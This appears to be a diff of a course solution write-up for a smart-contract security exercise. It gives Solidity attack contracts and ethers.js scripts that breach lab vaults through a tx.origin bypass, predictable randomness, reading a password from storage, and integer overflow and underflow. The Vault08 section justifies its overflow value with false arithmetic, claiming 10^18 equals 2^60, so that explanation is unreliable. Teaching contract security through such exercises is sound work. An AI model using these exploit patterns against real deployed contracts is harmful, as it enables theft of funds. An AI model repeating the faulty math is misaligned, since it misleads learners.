@@ -1,6 +1,6 @@
 # Smart Contracts Exercise 04: Unbreakable Vault -- Solution
 
-The solved exercise 4 can be found in this repository.
+The solved exercise 4 can be found in this [GitLab repository](https://gitlab.fel.cvut.cz/radovluk/smart-contracts-exercises/-/tree/main/04-Unbreakable-Vault/solution/solution-code?ref_type=heads).
 
 ## Vault01: A Password Password
 
@@ -31,9 +31,9 @@ await vault.connect(player).breachVault(hash);
 
 ## Vault03: Origins
 
-To breach `Vault03`, you need to bypass the requirement that `msg.sender` must not be equal to `tx.origin`. This means the function must be called from a smart contract rather than directly from an externally owned account (EOA).
+To breach `Vault03`, you need to bypass the requirement that `msg.sender` must not be equal to `tx.origin`. This means the function must be called from a smart contract rather than directly from an externally owned account (EOA). 
 
-Deploy the `Vault03Attack` contract, passing the vault's address as a parameter. Then, call the `attack` function from the attack contract, which in turn calls `breachVault()`. Since the attack contract acts as an intermediary, `msg.sender` will be the attack contract, while `tx.origin` remains the player's address, satisfying the vault's condition.
+Deploy the `Vault03Attack` contract, passing the vault's address as a parameter. Then, call the `attack` function from the attack contract, which in turn calls `breachVault()`. Since the attack contract acts as an intermediary, `msg.sender` will be the attack contract, while `tx.origin` remains the player's address, satisfying the vault's condition. 
 
 ```solidity
 // SPDX-License-Identifier: MIT
@@ -60,7 +60,7 @@ This successfully updates `lastSolver` to the player's address, completing the c
 
 ## Vault04: Pseudo-Random Trap
 
-To breach `Vault04`, you need to provide a correct guess computed using `block.timestamp` and `blockhash(block.number - 1)`. Since both values are accessible during the same transaction, you can compute the correct guess on-chain and submit it immediately. Deploy the `Vault04Attack` contract, passing the vault's address as a parameter. Then, call the `attack` function from the attack contract, which computes the guess and calls `breachVault()` with the correct value.
+To breach `Vault04`, you need to provide a correct guess computed using  `block.timestamp` and `blockhash(block.number - 1)`. Since both values are accessible during the same transaction, you can compute the correct guess on-chain and submit it immediately. Deploy the `Vault04Attack` contract, passing the vault's address as a parameter. Then, call the `attack` function from the attack contract, which computes the guess and calls `breachVault()` with the correct value.
 
 ```solidity
 // SPDX-License-Identifier: MIT
@@ -131,8 +131,8 @@ You can also find the password from a previous transactions that interacted with
 
 To breach `Vault07`, you need to figure out the stored `password` string, which is located in the contract's storage. The storage layout of the contract reveals that the password is stored at slot 4.
 
-| Name | Type | Slot | Offset | Bytes |
-|------|------|------|--------|-------|
+| **Name** | **Type** | **Slot** | **Offset** | **Bytes** |
+|----------|----------|----------|------------|-----------|
 | `lastSolver` | `address` | 0 | 0 | 20 |
 | `small1` | `uint8` | 0 | 20 | 1 |
 | `small2` | `uint16` | 0 | 21 | 2 |
@@ -166,4 +166,91 @@ const hashedPassword = ethers.solidityPackedKeccak256(
 // Call breachVault with the derived hashed password
 const tx = await vault.breachVault(hashedPassword);
 await tx.wait();
+```
+
+## Vault08: Tokens for Free
+
+To breach `Vault08`, you need to exploit an integer overflow vulnerability in the `buyTokens` function. Since the contract uses Solidity 0.7.6, which lacks built-in protection against overflow, you can find a value for `numTokens` that causes `numTokens * TOKEN_PRICE` to overflow to exactly 0. This allows you to purchase tokens without paying any ETH.
+
+To achieve this, use a value for `numTokens` that, when multiplied by 1 ether (10^18), overflows and wraps around to exactly 0 in a uint256. A perfect value for this is 2^238, since 2^238 × 10^18 = 2^238 × 2^60 ≈ 2^298, which exceeds the maximum uint256 value (2^256 - 1) and wraps around to 0.
+
+```javascript
+// Connect to the vault contract as the player
+const playerVault = vault.connect(player);
+
+// Calculate the token amount that will cause an overflow
+// 2^238 is chosen because when multiplied by 1 ether (10^18), 
+// it will overflow exactly to 0 in Solidity 0.7.6
+const numTokens = BigInt(1) << BigInt(238);
+
+// Call buyTokens with 0 ether value
+// Due to integer overflow, numTokens * TOKEN_PRICE will be 0
+await playerVault.buyTokens(numTokens, { value: 0 });
+
+// Verify that we received the tokens
+const playerBalance = await vault.tokenBalances(playerAddress);
+console.log("Player token balance:", playerBalance.toString());
+
+// Call breachVault to complete the challenge
+await playerVault.breachVault();
+```
+
+## Vault09: Less Is More
+
+To breach `Vault09`, you need to exploit an integer underflow vulnerability in the `transferFrom` function. The key observation is that the contract checks if the message sender has enough tokens, but not whether the `from` address has enough tokens. This allows you to cause an underflow in the `tokenBalances[from] -= amount` operation.
+
+First, deploy an attack contract that will interact with the vulnerable vault. Then, from your account (which starts with 1 token), approve the attack contract to spend tokens on your behalf. Next, have the attack contract call `transferFrom` to transfer more tokens than you actually have, causing an integer underflow in your token balance.
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity 0.7.6;
+
+interface IVault09 {
+    function transferFrom(address from, address to, uint256 amount) external;
+}
+
+contract Vault09Attack {
+    // Reference to the vulnerable vault contract
+    IVault09 public vault;
+    // Address of the player who deployed this contract
+    address immutable playerAddress;
+    
+    constructor(address _vaultAddress) {
+        vault = IVault09(_vaultAddress);
+        playerAddress = msg.sender;
+    }
+    
+    /**
+     * @notice Performs the attack by triggering an underflow in the vault contract
+     * @dev This exploit works because Solidity 0.7.6 doesn't have default overflow/underflow protection
+     */
+    function attack() external {      
+        // Transfer 1 token from player that has 0 tokens 
+        // The player amount will underflow and become 2**256 - 1
+        vault.transferFrom(playerAddress, address(this), 1);
+    }
+}
+```
+
+Complete the attack with the following JavaScript code:
+
+```javascript
+// Deploy the attacker contract from the player's account.
+attackVault = await ethers.deployContract("Vault09Attack", [vault.target], player);
+await attackVault.waitForDeployment();
+
+console.log("Exploit contract deployed at:", attackVault.target);
+
+// Player approves the exploit contract to spend any 2 tokens
+await vault.connect(player).approve(attackVault.target, 2);
+
+// Player transfers 1 token to the attack contract
+await vault.connect(player).transferFrom(playerAddress, attackVault.target, 1);
+
+// Execute the attack
+const tx = await attackVault.attack();
+await tx.wait();
+
+// Break the vault
+await vault.connect(player).breachVault();
 ```
